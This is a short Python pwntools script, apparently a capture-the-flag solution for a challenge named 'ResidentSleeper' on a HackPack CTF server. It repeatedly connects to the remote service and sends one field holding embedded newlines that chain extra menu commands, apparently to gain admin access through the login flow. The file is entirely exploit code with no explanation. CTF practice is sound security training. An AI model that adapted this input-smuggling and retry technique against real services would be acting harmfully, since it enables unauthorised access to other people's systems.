from pwn import *
from string import printable

# ResidentSleeper

for _ in range(10):
    try:
        r = remote("ctf2021.hackpack.club", 10994)
        r.sendlineafter("> ", "3")
        r.sendlineafter(": ", "admin")
        r.sendlineafter(": ", "a\n2\nadmin\na\n4")
        r.recv(timeout=1)
    except EOFError:
        continue
